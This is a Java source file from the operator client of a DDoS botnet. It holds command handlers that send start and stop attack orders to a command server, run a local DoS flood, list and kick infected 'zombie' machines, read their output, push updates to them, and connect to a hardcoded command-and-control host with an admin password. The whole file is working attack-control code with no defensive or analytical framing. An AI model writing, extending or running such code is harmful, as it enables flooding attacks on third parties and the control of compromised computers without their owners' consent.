package org.ddos.client.command;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.regex.Pattern;

import org.ddos.client.DOS;
import org.ddos.client.Exceptions;
import org.ddos.network.ClientNetwork;
import org.ddos.updater.Updater;
import org.ddos.util.ActiveAttack;
import org.ddos.util.Computer;
import org.ddos.util.Console;
import org.ddos.util.Status;
import org.jcom.Command;
import org.jcom.CommandException;
import org.jcom.CommandInterruptedException;
import org.jcom.CommandJob;
import org.jcom.UnknownCommandException;
import org.jnetwork.Connection;
import org.jnetwork.DataPackage;
import org.jnetwork.SocketType;

public class CommandActions {
	public static CommandJob getDdosAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (command.hasFlag("-v")) {
					try {
						if (!(boolean) command.getInterface()
								.executeCommand("valid " + command.getCommandArguments()[1])) {
							return null;
						}
					} catch (CommandException e) {
						e.printStackTrace();
					}
				}

				try {
					if (command.getCommandArguments()[0].equals("start")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage(command.getCommandArguments()[1],
										command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
										command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1)
												.setMessage("START_DDOS"));
						System.out.println("Started DDoS attack on " + command.getCommandArguments()[1] + ".");
					} else if (command.getCommandArguments()[0].equals("stop")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage(command.getCommandArguments()[1]).setMessage("STOP_DDOS"));
						System.out.println("Stopped DDoS attack on " + command.getCommandArguments()[1] + ".");
					} else {
						System.out.println("Unkown DDoS action: " + command.getCommandArguments()[0]);
						return null;
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return null;
			}
		};

	}

	public static CommandJob getKickAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				ArrayList<SocketAddress> addresses = new ArrayList<>();

				for (String addr : command.getCommandArguments()) {
					String[] split = addr.split(Pattern.quote(":"), 0);
					addresses.add(new InetSocketAddress(split[0], Integer.parseInt(split[1])));
				}
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage(
									(Serializable[]) addresses.toArray(new SocketAddress[addresses.size()]))
											.setMessage("KICK_ZOMBIES"));
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				}
				return null;

			}
		};
	}

	public static CommandJob getListAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				command.getCommandArguments()[0] = command.getCommandArguments()[0].toLowerCase();
				try {
					if (command.getCommandArguments()[0].equals("zombies")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("LIST_ZOMBIES"));
					} else if (command.getCommandArguments()[0].equals("clients")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("LIST_CLIENTS"));
					} else if (command.getCommandArguments()[0].equals("computers")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("LIST_ALL"));
					} else {
						System.out.println("Unknown list target: " + command.getCommandArguments()[0]);
						return null;
					}

					Computer[] addresses = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
							.readObject()).getObjects();
					System.out.println(
							"There are " + addresses.length + " " + command.getCommandArguments()[0] + " connected.");

					for (Computer address : addresses) {
						System.out.println(address.getAddress() + (command.getCommandArguments()[0].equals("computers")
								? (address.isZombie() ? " (zombie)" : " (client)") : ""));
					}

					return addresses.length;
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				} catch (ClassNotFoundException e) {
					e.printStackTrace();
				} finally {
					return null;
				}
			}
		};
	}

	public static CommandJob getHelpForCommandAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command c) {
				try {
					System.out.println(Commands.getHelpForAction(c.getCommandArguments()[0], c.getInterface()));
				} catch (UnknownCommandException e) {
					System.out.println("Unknown command: " + c.getCommandArguments()[0]);
				}
				return null;

			}
		};
	}

	public static CommandJob getInvalidCommandAction(final String baseCommand) {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				System.out.println(
						"Invalid command \"" + baseCommand + "\". Use the \"help\" command for a list of commands.");
				return null;
			}
		};
	}

	public static CommandJob getUniversalHelpAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command c) {
				System.out.println("Commands: ");

				String[] commandNames = c.getInterface().getAllCommandsNames();
				Arrays.sort(commandNames);
				for (String command : commandNames) {
					System.out.println("\t" + command);
				}
				System.out.println("Type \"help <command>\" for help with a specific command.");
				return null;
			}
		};
	}

	public static CommandJob getExitAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (command.hasFlag("-k")) {
					try {
						command.getInterface().executeCommand("kick");
					} catch (CommandException e) {
						e.printStackTrace();
					}
				}

				System.exit(0);
				return null;
			}
		};
	}

	public static CommandJob getKickAllZombiesAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("KICK_ALL_ZOMBIES"));
					try {
						Thread.sleep(1000); // prevent shutdown before object is
											// read if exit command has -k flag
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				}

				return null;
			}
		};
	}

	public static CommandJob getDosAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (command.hasFlag("-v")) {
					try {
						if (!(boolean) command.getInterface()
								.executeCommand("valid " + command.getCommandArguments()[1])) {
							return null;
						}
					} catch (CommandException e) {
						e.printStackTrace();
					}
				}

				if (command.getCommandArguments()[0].equals("start")) {
					DOS.setArguments(command.getCommandArguments()[1],
							command.hasFlag("-l") ? Integer.parseInt(command.getFlag("-l").getValue()) : 32,
							command.hasFlag("-t") ? Integer.parseInt(command.getFlag("-t").getValue()) : 1);
					DOS.start();
					System.out.println("Started DoS attack on " + command.getCommandArguments()[1] + ".");
				} else if (command.getCommandArguments()[0].equals("stop")) {
					DOS.stop();
					System.out.println("Stopped DoS attack on " + command.getCommandArguments()[1] + ".");
				} else {
					System.out.println("Unknown DoS action: " + command.getCommandArguments()[0]);
				}

				return null;
			}
		};
	}

	public static CommandJob getWaitAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				Object monitor = new Object();
				synchronized (monitor) {
					try {
						monitor.wait();
					} catch (InterruptedException e) {
						// good! the user interrupted the thread
					}
				}

				return null;
			}
		};
	}

	public static CommandJob getWaitForMillisecondsAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					Thread.sleep(Long.parseLong(command.getCommandArguments()[0]));
				} catch (InterruptedException e) {
					// interrupted by user
				}

				return null;
			}
		};
	}

	public static CommandJob getValidAddressAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				System.out.print("Validating address... ");
				try {
					boolean valid = (boolean) command.getInterface()
							.executeCommand("ping " + command.getCommandArguments()[0]);
					if (valid) {
						System.out.print("Address Status: VALID\n");
					} else {
						System.out.println("Address Status: INVALID");
					}

					return valid;
				} catch (CommandInterruptedException e) {
					return false;
				} catch (CommandException e) {
					System.out.print("Address Status: ERROR: " + e.getMessage());
				}
				return false;
			}
		};
	}

	public static CommandJob getPingAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ProcessBuilder builder = new ProcessBuilder("ping", command.getCommandArguments()[0]);
					builder.redirectErrorStream(true);
					Process process = builder.start();
					InputStream is = process.getInputStream();
					BufferedReader reader = new BufferedReader(new InputStreamReader(is));

					String line = null;
					while ((line = reader.readLine()) != null) {
						System.out.println(line);
					}

					return process.waitFor() == 0;
				} catch (Exception e) {
					e.printStackTrace();
				}
				return false;
			}
		};
	}

	public static CommandJob getReadFromZombieAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream().writeObject(
							new DataPackage(command.getCommandArguments()[0]).setMessage("START_READ_ZOMBIE"));

					while (true) {
						System.out.println(ClientNetwork.getClient().getInputStream().readObject());
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (Exception e) {
					e.printStackTrace();
				}
				return null;
			}
		};
	}

	public static CommandJob getReadFromServerAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("START_READ_SERVER"));

					while (true) {
						System.out.println(((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
								.getObjects()[0]);
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (Exception e) {
					e.printStackTrace();
				}
				return null;
			}
		};
	}

	public static CommandJob getKillServerAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("KILL_SERVER"));
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
					return null;
				} catch (IOException e) {
					e.printStackTrace();
					return null;
				}
				System.out.println("Successfully killed the server.");
				return null;
			}
		};
	}

	public static CommandJob getUpdateAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				System.out.print("Are you sure you want to perform an update on the chosen target's machine? (Y/N): ");
				if (!Console.input.nextLine().toLowerCase().trim().equals("y")) {
					System.out.println("Aborting update.");
					return null;
				}

				try {
					if (command.getCommandArguments()[0].equals("server")) {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("UPDATE_SERVER"));
					} else if (command.getCommandArguments()[0].equals("this")) {
						Updater.downloadIfNonexistent();

						System.out.println("The client will now exit. Relaunch it in about ten seconds.");

						Runtime.getRuntime().exec("java -jar " + System.getProperty("user.dir") + File.separator
								+ Updater.NAME + ".jar Zombie");
						System.exit(0);
					} else if (command.getCommandArguments()[0].equals("zombie")) {
						if (!command.hasFlag("-i")) {
							System.err.println(
									"No target for the update. Please use the -i flag. For more information, type \"help update\".");
							return null;
						}

						String[] split = command.getFlag("-i").getValue().split(Pattern.quote(":"), 0);

						ClientNetwork.getClient().getOutputStream().writeObject(
								new DataPackage(new InetSocketAddress(split[0], Integer.parseInt(split[1])))
										.setMessage("UPDATE_ZOMBIE"));
					} else {
						System.out.println("Unknown target: " + command.getCommandArguments()[0]);
						return null;
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				}
				System.out.println(
						"Updated the Delimination " + command.getCommandArguments()[0] + " program on the target.");
				return null;
			}
		};
	}

	public static CommandJob getConnectAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (ClientNetwork.getClient() != null) {
					System.out.println("Already connected; please disconnect first.");
					return null;
				}
				try {
					ClientNetwork.setClient(new Connection(SocketType.DEFAULT, "server2.jacobsrandomsite.com", 25565));

					while (true) {
						System.out.print("Enter the admin password: ");
						String password = Console.input.nextLine();
						try {
							ClientNetwork.getClient().getOutputStream()
									.writeObject(new DataPackage(false, password).setMessage("INITIAL_PACKAGE"));

							if (!(boolean) ClientNetwork.getClient().getInputStream().readObject()) {
								System.out.println("Invalid password.");
								System.exit(1);
							} else {
								break;
							}
						} catch (Exception e2) {
							System.out.println("An exception occurred: " + e2.getMessage() + " ("
									+ e2.getClass().getSimpleName() + ")");
							return null;
						}
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				}
				System.out.println("Connected back to the server.");

				return null;
			}
		};
	}

	public static CommandJob getDisconnectAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				if (ClientNetwork.getClient() != null) {
					try {
						ClientNetwork.getClient().close();
						ClientNetwork.setClient(null);
					} catch (SocketException | NullPointerException e) {
						Exceptions.unconnectedException();
					} catch (Exception e) {
						return null;
					}
				} else {
					System.out.println("Cannot disconnect: not connected in the first place.");
					return null;
				}

				System.out.println("Disconnected from server.");
				return null;
			}
		};
	}

	public static CommandJob getStatusAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					ClientNetwork.getClient().getOutputStream()
							.writeObject(new DataPackage().setMessage("DDOS_STATUS"));

					Status status = (Status) ((DataPackage) ClientNetwork.getClient().getInputStream().readObject())
							.getObjects()[0];
					if (status.getAttacks().length == 0) {
						System.out.println("No DDoS attacks are running.");
						return null;
					}
					System.out.println("All active DDoS attacks are as follows:");
					for (ActiveAttack attack : status.getAttacks()) {
						System.out.println("\tAttack on: " + attack.getAttackingAddress());
						System.out.println("\t\tOriginator: " + attack.getOriginator());
						System.out.println("\t\tAttacking Zombies:");
						if (attack.getZombieAddresses().length == 0) {
							System.out.println("\t\t\tNone");
							continue;
						}
						for (SocketAddress zombieAddress : attack.getZombieAddresses()) {
							System.out.println("\t\t\t" + zombieAddress.toString());
						}
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (Exception e) {
					return null;
				}
				return null;
			}
		};
	}

	public static CommandJob getBanlistAction() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				try {
					if (command.hasCommandArguments()) {
						String ip = command.getCommandArguments()[1].split(Pattern.quote(":"))[0].trim();
						int port = Integer
								.parseInt(command.getCommandArguments()[1].split(Pattern.quote(":"))[1].trim());

						if (command.getCommandArguments()[0].equals("add")) {
							ClientNetwork.getClient().getOutputStream().writeObject(
									new DataPackage(new InetSocketAddress(ip, port)).setMessage("BAN_COMPUTER"));
							System.out.println("Added " + ip + " from the banlist.");
						} else if (command.getCommandArguments()[0].equals("remove")) {
							ClientNetwork.getClient().getOutputStream().writeObject(
									new DataPackage(new InetSocketAddress(ip, port)).setMessage("UNBAN_COMPTUER"));
							System.out.println("Removed " + ip + " from the banlist.");
						} else {
							System.out.println("Unknown banlist action: " + command.getCommandArguments()[0]);
							return null;
						}
					} else {
						ClientNetwork.getClient().getOutputStream()
								.writeObject(new DataPackage().setMessage("GET_BAN_LIST"));
						Computer[] computers = (Computer[]) ((DataPackage) ClientNetwork.getClient().getInputStream()
								.readObject()).getObjects();
						System.out.println("Banned computers:");
						if (computers.length == 0) {
							System.out.println("\tNone");
							return null;
						}
						for (Computer computer : computers) {
							System.out.println(computer.getAddress().toString().split(Pattern.quote(":"))[0] + " ("
									+ (computer.isZombie() ? "zombie" : "client") + ")");
						}
					}
				} catch (SocketException | NullPointerException e) {
					Exceptions.unconnectedException();
				} catch (IOException e) {
					e.printStackTrace();
				} catch (ClassNotFoundException e) {
					e.printStackTrace();
				}
				return null;
			}
		};
	}

	public static CommandJob getEchoActions() {
		return new CommandJob() {
			@Override
			public Object doJob(Command command) {
				for (String arg : command.getCommandArguments()) {
					System.out.println(arg);
				}
				return null;
			}
		};
	}
}